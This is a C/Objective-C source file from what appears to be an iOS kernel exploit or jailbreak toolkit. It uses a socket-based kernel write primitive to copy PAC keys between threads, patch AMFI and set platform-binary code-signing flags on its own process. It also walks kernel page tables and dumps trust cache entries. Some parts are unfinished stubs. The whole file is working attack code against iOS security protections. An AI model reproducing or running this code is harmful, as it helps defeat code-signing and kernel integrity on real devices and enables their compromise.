#import "kpac_bypass.h"
#import "amfi_bypass.h"
#import "../kexploit/kutils.h"
#import "../kexploit/krw.h"
#import "../kexploit/xpaci.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kexploit_opa334.h"
#import "../TaskRop/Thread.h"

#include <mach/mach.h>
#include <CommonCrypto/CommonDigest.h>
#include <sys/socket.h>
#include <netinet/icmp6.h>

// ---------------------------------------------------------------------------
// Safe write: directly uses setsockopt like early_kwrite32bytes but does NOT
// crash on failure.  Returns true if the write succeeded, false otherwise.
// ---------------------------------------------------------------------------
extern int controlSocket, rwSocket;
extern uint8_t controlData[];
static bool safe_setsockopt_write64(uint64_t where, uint64_t what)
{
    if (controlSocket < 0 || rwSocket < 0) return false;

    memset(controlData, 0, EARLY_KRW_LENGTH);
    *(uint64_t *)controlData = where;
    if (setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH) != 0)
        return false;

    uint8_t writeBuf[EARLY_KRW_LENGTH];
    memset(writeBuf, 0, sizeof(writeBuf));
    *(uint64_t *)writeBuf = what;
    if (setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH) != 0)
        return false;

    return true;
}

static bool safe_kwrite32(uint64_t where, uint32_t what)
{
    uint64_t aligned = where & ~0x7ULL;
    int shift = (int)(where & 0x7ULL) * 8;
    uint64_t old = kread64(aligned);
    uint64_t mask = 0xFFFFFFFFULL << shift;
    uint64_t new_val = (old & ~mask) | ((uint64_t)what << shift);
    return safe_setsockopt_write64(aligned, new_val);
}

// ---------------------------------------------------------------------------
// Thread-based PAC key manipulation (non-PPL, works via kwrite64)
// ---------------------------------------------------------------------------

bool kpac_read_thread_pac_keys(uint64_t threadAddr, uint64_t *jop_pid, uint64_t *rop_pid)
{
    if (!threadAddr || !is_kaddr_valid(threadAddr)) {
        printf("[KeyStone] invalid thread addr 0x%llx\n", threadAddr);
        return false;
    }
    if (jop_pid) *jop_pid = thread_get_jop_pid(threadAddr);
    if (rop_pid) *rop_pid = thread_get_rop_pid(threadAddr);
    return true;
}

void kpac_set_thread_pac_keys(uint64_t threadAddr, uint64_t jop_pid, uint64_t rop_pid)
{
    thread_set_pac_keys(threadAddr, jop_pid, rop_pid);
    printf("[KeyStone] thread 0x%llx: jop_pid=0x%llx rop_pid=0x%llx\n",
           threadAddr, jop_pid, rop_pid);
}

bool kpac_copy_pac_context(uint64_t srcThread, uint64_t dstThread)
{
    uint64_t jop, rop;
    if (!kpac_read_thread_pac_keys(srcThread, &jop, &rop))
        return false;
    kpac_set_thread_pac_keys(dstThread, jop, rop);
    return true;
}

// ---------------------------------------------------------------------------
// AMFI bypass integration
// ---------------------------------------------------------------------------

bool kpac_platformize_self(void)
{
    printf("[KeyStone] platformizing self via AMFI patch...\n");

    if (!amfi_patch_self()) {
        printf("[KeyStone] AMFI patch failed\n");
        return false;
    }

    // Try to write CS_PLATFORM_BINARY via virtual kwrite (may fail on PPL)
    uint64_t proc = proc_self();
    if (proc) {
        uint64_t proc_ro = kread64(proc + off_proc_p_proc_ro);
        if (proc_ro && is_kaddr_valid(proc_ro)) {
            uint64_t csflags_addr = proc_ro + off_proc_ro_csflags;
            if (!is_kaddr_valid(csflags_addr)) {
                printf("[KeyStone] invalid csflags address 0x%llx (proc_ro=0x%llx off=0x%x)\n",
                       csflags_addr, proc_ro, off_proc_ro_csflags);
            } else {
                uint32_t cs = kread32(csflags_addr);
                printf("[KeyStone] csflags = 0x%08x\n", cs);
                uint32_t desired = cs | CS_VALID | CS_PLATFORM_BINARY;
                if (cs != desired) {
                    if (safe_kwrite32(csflags_addr, desired)) {
                        uint32_t v = kread32(csflags_addr);
                        if (v == desired) {
                            printf("[KeyStone] csflags patched via safe_kwrite32!\n");
                            return true;
                        }
                    }
                    printf("[KeyStone] safe kwrite32 csflags failed (PPL)\n");
                } else {
                    printf("[KeyStone] csflags already correct\n");
                    return true;
                }
            }
        } else {
            printf("[KeyStone] invalid proc_ro 0x%llx\n", proc_ro);
        }
    }

    printf("[KeyStone] platformize complete (AMFI patched, csflags needs PPL bypass)\n");
    return true;
}

// ---------------------------------------------------------------------------
// Physical OOB helpers
// ---------------------------------------------------------------------------

bool kpac_phys_read(uint64_t kaddr, void *buf, size_t size)
{
    kreadbuf(kaddr, buf, size);
    return true;
}

bool kpac_phys_write(uint64_t kaddr, const void *buf, size_t size)
{
    kwritebuf(kaddr, buf, size);
    return true;
}

// ---------------------------------------------------------------------------
// VA → PA conversion via page table walk
// ---------------------------------------------------------------------------

static uint64_t find_l1_table(void)
{
    // Strategy: read the kernel_task's vm_map → pmap → l1_table.
    // Scan allprocs for pid 0 (kernel_task).
    uint64_t self = proc_self();
    if (!self) return 0;

    // Walk the allproc linked list to find pid 0 (kernel_task).
    uint64_t prev = self;
    for (int i = 0; i < 200; i++) {
        uint64_t next = kread64(prev + off_proc_p_list_le_next);
        if (!next || !is_kaddr_valid(next)) break;
        uint32_t pid = kread32(next + off_proc_p_pid);
        if (pid == 0) {
            // Found kernel_task proc
            uint64_t proc_ro = kread64(next + off_proc_p_proc_ro);
            if (!proc_ro) return 0;
            uint64_t task = kread_ptr(proc_ro + off_proc_ro_pr_task);
            if (!task) return 0;
            uint64_t map = kread64(task + off_task_map);
            if (!map) return 0;

            // Read pmap from vm_map
            // On arm64e, vm_map.pmap offset varies. Try common offsets.
            uint64_t pmap = kread64(map + 0x40); // common pmap offset
            if (!pmap || !is_kaddr_valid(pmap)) {
                pmap = kread64(map + 0x48);
            }
            if (!pmap || !is_kaddr_valid(pmap)) {
                pmap = kread64(map + 0x38);
            }
            if (!pmap || !is_kaddr_valid(pmap)) return 0;

            // pmap structure: l1_table is typically the first field
            // or at a small offset.
            uint64_t l1 = kread64(pmap + 0x00);
            if (l1 && is_kaddr_valid(l1)) return l1;
            l1 = kread64(pmap + 0x08);
            if (l1 && is_kaddr_valid(l1)) return l1;
            l1 = kread64(pmap + 0x10);
            if (l1 && is_kaddr_valid(l1)) return l1;

            return 0;
        }
        prev = next;
    }
    return 0;
}

uint64_t kpac_virt_to_phys(uint64_t kaddr)
{
    uint64_t l1_base = find_l1_table();
    if (!l1_base) {
        printf("[KeyStone] cannot find L1 page table\n");
        return 0;
    }

    // 16KB page, 3-level: L1(9b) → L2(9b) → L3(9b) → page(14b)
    // L1 index: bits [40:32]
    // L2 index: bits [31:23]
    // L3 index: bits [22:14]
    // But the exact format depends on page table config.
    // Try the common iOS 18 arm64e 3-level format:

    uint64_t l1_idx = (kaddr >> 32) & 0x1FF;
    uint64_t l2_idx = (kaddr >> 23) & 0x1FF;
    uint64_t l3_idx = (kaddr >> 14) & 0x1FF;

    uint64_t l1_entry = kread64(l1_base + l1_idx * 8);
    if ((l1_entry & 3) != 3) {
        printf("[KeyStone] L1 entry invalid (0x%llx)\n", l1_entry);
        return 0;
    }

    uint64_t l2_base = l1_entry & 0xFFFFFFFFF000ULL;
    if (!l2_base || !is_kaddr_valid(l2_base)) {
        printf("[KeyStone] invalid L2 base from entry\n");
        return 0;
    }

    uint64_t l2_entry = kread64(l2_base + l2_idx * 8);
    if ((l2_entry & 3) == 3) {
        // Table descriptor → L3
        uint64_t l3_base = l2_entry & 0xFFFFFFFFF000ULL;
        if (!l3_base || !is_kaddr_valid(l3_base)) return 0;

        uint64_t l3_entry = kread64(l3_base + l3_idx * 8);
        if ((l3_entry & 3) != 3) {
            printf("[KeyStone] L3 entry not a page (0x%llx)\n", l3_entry);
            return 0;
        }

        return (l3_entry & 0xFFFFFFFFC000ULL) | (kaddr & 0x3FFF);
    } else if ((l2_entry & 3) == 1) {
        // Block descriptor (typically 2MB for 16K pages)
        return (l2_entry & 0xFFFFFFE00000ULL) | (kaddr & 0x1FFFFF);
    }

    printf("[KeyStone] unexpected L2 entry type 0x%llx\n", l2_entry);
    return 0;
}

// ---------------------------------------------------------------------------
// proc_ro.csflags write via physical OOB
// ---------------------------------------------------------------------------

bool kpac_write_csflags(uint64_t proc, uint32_t csflags)
{
    if (!proc || !is_kaddr_valid(proc)) return false;

    uint64_t proc_ro = kread64(proc + off_proc_p_proc_ro);
    if (!proc_ro || !is_kaddr_valid(proc_ro)) return false;

    uint64_t target_va = proc_ro + off_proc_ro_csflags;
    uint32_t current = kread32(target_va);
    printf("[KeyStone] csflags at va 0x%llx: 0x%08x -> 0x%08x\n",
           target_va, current, csflags);

    if (current == csflags) return true;

    // Try virtual kwrite32 first (safe, won't crash on PPL/SPTM)
    if (safe_kwrite32(target_va, csflags)) {
        if (kread32(target_va) == csflags) {
            printf("[KeyStone] csflags patched via safe virtual write\n");
            return true;
        }
    }
    printf("[KeyStone] csflags virtual write failed (PPL/SPTM)\n");

    // Physical write attempt
    uint64_t pa = kpac_virt_to_phys(target_va);
    if (!pa) {
        printf("[KeyStone] cannot resolve physical addr for csflags\n");
        return false;
    }

    printf("[KeyStone] PA: 0x%llx. OOB write not yet wired.\n", pa);
    return false;
}

// ---------------------------------------------------------------------------
// Trust cache research
// ---------------------------------------------------------------------------

// Search kernel memory for the trust_cache_rt global.
// This is a pointer to a linked list of trust cache entries in PPL memory.
// On iOS 16+, it's found by xpf_find_ppl_trust_cache_rt (PPL path)
// or xpf_find_trust_cache_rt (non-PPL path, arm64 only).
static uint64_t find_trust_cache_rt(void)
{
    // trust_cache_rt is a pointer in kernel data const section.
    // Without XPF, try known offsets from kernel_base.
    // On iOS 18 arm64e, it's typically in __DATA_CONST.__const.

    // Strategy: scan kernel data sections for pointers that look like
    // a linked list of trust cache entries (entries start with a
    // CDHash array).

    // For now, return 0 — trust_cache_rt needs XPF offline analysis.
    return 0;
}

uint64_t kpac_find_trust_cache_rt(void)
{
    uint64_t tc = find_trust_cache_rt();
    printf("[KeyStone] trust_cache_rt = 0x%llx\n", tc);
    return tc;
}

int kpac_dump_trust_cache(void)
{
    uint64_t tc = find_trust_cache_rt();
    if (!tc) {
        printf("[KeyStone] trust cache not found at runtime\n");
        printf("[KeyStone] use kpac_scan_trust_cache() with a known address\n");
        return -1;
    }

    // trust_cache_rt points to the root of a linked list of static TC entries.
    // Each entry is a struct with a linked list pointer + CD hash array.
    // Dump what we can.
    uint64_t entry = kread64(tc); // deref the rt pointer
    printf("[KeyStone] root entry = 0x%llx\n", entry);
    return 0;
}

int kpac_scan_trust_cache(uint64_t address)
{
    // Read and dump a trust cache entry at the given kernel virtual address.
    if (!address || !is_kaddr_valid(address)) {
        printf("[KeyStone] invalid address\n");
        return -1;
    }

    // Trust cache entry structure (approximate, varies by iOS version):
    // +0x00: next pointer (PAC'd)
    // +0x08: previous pointer (PAC'd)
    // +0x10: hash count
    // +0x18: hash array (each hash is 20 bytes SHA1)
    uint64_t next = kread64(address);
    uint64_t prev = kread64(address + 8);
    uint32_t count = kread32(address + 0x10);

    printf("[KeyStone] TC entry at 0x%llx:\n", address);
    printf("  next = 0x%llx (stripped: 0x%llx)\n", next, xpaci(next));
    printf("  prev = 0x%llx (stripped: 0x%llx)\n", prev, xpaci(prev));
    printf("  count = %u\n", count);

    // Dump first few hashes
    for (uint32_t i = 0; i < count && i < 8; i++) {
        uint8_t hash[20];
        kreadbuf(address + 0x18 + i * 20, hash, 20);
        printf("  hash[%u]: ", i);
        for (int j = 0; j < 20; j++) printf("%02x", hash[j]);
        printf("\n");
    }

    return 0;
}

// ---------------------------------------------------------------------------
// Signing oracle
// ---------------------------------------------------------------------------

bool kpac_signing_oracle_available(void)
{
    return false;
}

uint64_t kpac_sign_thread_state(uint64_t thread_kaddr)
{
    (void)thread_kaddr;
    return 0;
}
